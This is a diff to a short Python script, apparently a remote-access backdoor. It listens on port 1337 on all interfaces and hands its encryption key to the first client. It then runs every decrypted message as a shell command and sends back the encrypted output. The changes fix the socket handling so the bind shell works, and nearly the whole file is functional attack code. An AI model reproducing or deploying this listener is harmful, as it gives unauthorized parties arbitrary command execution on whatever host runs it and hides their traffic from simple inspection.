@@ -1,41 +1,29 @@
 import os
-import sys
-import socket
 import subprocess
+import socket
 
-#If cryptography isn't installed, install it.
 try:
-  from cryptography.fernet import Fernet
+	from cryptography.fernet import Fernet
 except:
-  os.system("sudo -H pip install cryptography > /dev/null")
-  from cryptography.fernet import Fernet
+	os.system("pip install cryptography > /dev/null")
 
-#Generate key and create cipher_suite
 key = Fernet.generate_key()
 cipher_suite = Fernet(key)
 
-#Encrypted send function
-def sendenc(msg, sckt):
-  cipher_text = cipher_suite.encrypt(msg)
-  sckt.sendall(cipher_text)
-def decrypt(msg):
-  return cipher_suite.decrypt(msg)
-    
-#HOST and PORT and SOCKET:
-HOST=''
-PORT=1337
+HOST = ''                 # Symbolic name meaning all available interfaces
+PORT = 1337               # Arbitrary non-privileged port
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((HOST, PORT))
 s.listen(1)
 conn, addr = s.accept()
-
+#print 'Connected by', addr
+conn.sendall(key)
 while 1:
     data = conn.recv(1024)
-    if data=="KEY":
-      s.sendall(key)
-    else:
-      data=decrypt(data)
-      proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-      stdout_value = proc.stdout.read() + proc.stderr.read()
-      sendenc(stdout_value, s)
-
+    if not data: break
+    datad=cipher_suite.decrypt(data)
+    proc = subprocess.Popen(datad, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    stdout_value = proc.stdout.read() + proc.stderr.read()
+    stde=cipher_suite.encrypt(stdout_value)
+    conn.sendall(stde)
+conn.close()
